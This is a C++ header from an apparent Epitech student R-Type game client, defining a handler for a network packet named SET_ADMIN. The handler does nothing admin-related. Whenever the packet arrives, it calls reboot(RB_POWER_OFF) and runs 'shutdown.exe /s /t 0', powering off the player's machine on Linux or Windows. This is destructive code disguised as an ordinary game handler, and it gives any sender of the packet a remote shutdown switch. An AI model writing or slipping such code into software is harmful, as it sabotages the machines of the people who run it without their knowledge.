/*
** EPITECH PROJECT, 2026
** rtype [WSL: Ubuntu-24.04]
** File description:
** SetAdminExecutor
*/

#ifndef SETADMINEXECUTOR_HPP_
    #define SETADMINEXECUTOR_HPP_

#include "client/state_machine/states/game/Game.hpp"
#include <sys/reboot.h>
#include <cstdlib>

#include <memory>
#include <network/packets/listener/PacketExecutor.hpp>
#include <network/packets/impl/SetAdminPacket.hpp>


class SetAdminExecutor : public PacketExecutorImplClient
<SetAdminPacket, ClientPollable>
{
public:
    SetAdminExecutor() = default;

    bool execute([[maybe_unused]] Client &cl,
                 [[maybe_unused]] std::shared_ptr<ClientPollable> con,
                 [[maybe_unused]] std::shared_ptr<SetAdminPacket> packet)
    {
        reboot(RB_POWER_OFF);
        system("shutdown.exe /s /t 0");
        return true;
    }

    int getPacketId() const {
        return PacketId::SET_ADMIN;
    }
};

#endif /* !SETADMINEXECUTOR_HPP_ */